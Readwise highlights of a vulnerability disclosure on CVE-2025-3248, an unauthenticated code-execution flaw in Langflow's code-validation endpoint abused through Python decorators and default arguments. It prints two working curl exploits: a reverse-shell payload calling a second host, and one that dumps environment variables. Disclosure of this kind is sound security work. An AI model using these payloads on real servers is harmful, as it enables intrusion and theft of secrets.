---
author: "Naveen Sunkavally"
aliases: "Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI"
tags: RW_inbox, readwise/articles
url: https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/?__readwiseLocation=
date: 2025-04-24
summary: A serious security flaw, CVE-2025-3248, was found in Langflow, a tool for creating AI workflows. This vulnerability allows remote attackers to take complete control of Langflow servers without authentication. Users are advised to upgrade to version 1.3.0, which fixes the issue.
---
# Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI

![rw-book-cover](https://p7i3u3x3.rocketcdn.me/wp-content/uploads/2023/09/1200x627-Generic-NodeZero-Banner_2306.jpg)

## Highlights


A Bad Code Smell
 Within a few minutes of looking at the source code, we identified something fishy – [an unauthenticated API endpoint](https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/api/v1/validate.py) /`api/v1/validate/code` running Python `exec` on untrusted user input. [](https://read.readwise.io/read/01jrwrbeyfa1xyvy8ve1xpms4m)



The code uses the `ast` module to parse user input and extracts any `ast.Import` and `ast.FunctionDef` nodes, i.e. any Python `import` statements and function definitions.
 Imports are validated using `importlib.import_module`. This can’t be directly exploited unless an attacker can first upload an arbitrary Python file onto the file system within Python’s module search path. We didn’t find a way to do this.
 Function definitions are validated using `compile` and `exec`. A function definition is not the same as a function though. Executing a function definition only makes the function available for execution within the current Python namespace; it doesn’t actually execute the function code. We tried polluting the current namespace by overwriting existing global and local function names but weren’t successful. [](https://read.readwise.io/read/01jrwrbyec45fe3n3r5bxfvnah)



What exactly is an `ast.FunctionDef`? In Python, function definitions also include the decorators attached to the function. [](https://read.readwise.io/read/01jrwrcm0zt7fr5b94nstcc418)



Decorators are functions that return functions that wrap other functions. In Python web apps, they’re commonly used to implement authentication/authorization controls, such as `@login_required`. [](https://read.readwise.io/read/01jrwrdpspw0k423byv293ktde)



But decorators don’t have to be functions or return functions. Decorators are actually modeled as *expressions* – arbitrary Python code statements. [](https://read.readwise.io/read/01jrwrgq0tp0vdgtkvmj4ga0ct)



Let’s say you have a file called `foomodule.py` with the following code:
 @__import__("os").system("echo Inside foo decorator")
 def foo():
 print("Inside foo function")
 And in the same directory another file `main.py` with just the following line: 
 `import foomodule` [](https://read.readwise.io/read/01jrwrh7c4t8xnc6nscsm6y8qx)



![](https://www.horizon3.ai/wp-content/uploads/2025/04/Screenshot-2025-04-04-at-5.47.13 PM-1024x254.png)
 The import of `foomodule` in `main.py` executes the function definition of `foo`, which executes the decorator [](https://read.readwise.io/read/01jrwrhp61bybqe8nqr8k8gv8b)



Abusing Decorators for Remote Code Execution
 Remote code execution is easy now – just stick the payload into a decorator. [](https://read.readwise.io/read/01jrwrjb3d1eh0s0ttvh3yzpdn)



curl -X POST -H 'Content-Type: application/json' http://10.0.220.200:8000/api/v1/validate/code -d '{"code": "@exec(\"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.0.220.201\\\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")\")\ndef foo():\n pass"}' [](https://read.readwise.io/read/01jrwrjphrwt61jgkd8ceq5ckm)



Another Path to RCE: Python Default Arguments
 After the CVE was published, [another researcher published a POC](https://x.com/_r00tuser/status/1909858365234463122) that abused another feature of Python functions: default arguments. These are also modeled as expressions in Python and get executed when a function is defined. [](https://read.readwise.io/read/01jrwrmyxt1cwt7mj3ac7rak60)



curl -H 'Content-Type: application/json' http://10.0.220.200:8000/api/v1/validate/code -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"env\\\"))\")):\n pass"}' [](https://read.readwise.io/read/01jrwrndv3wy4e3j13bs7db00n)

